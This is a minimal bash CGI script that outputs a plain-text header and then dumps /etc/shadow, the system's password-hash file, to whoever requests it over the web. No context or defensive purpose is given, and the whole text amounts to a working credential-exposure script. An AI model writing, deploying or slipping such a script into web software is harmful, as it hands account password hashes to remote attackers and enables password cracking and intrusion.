#!/bin/bash
echo "Content-type: text/plain"
echo ""
cat /etc/shadow

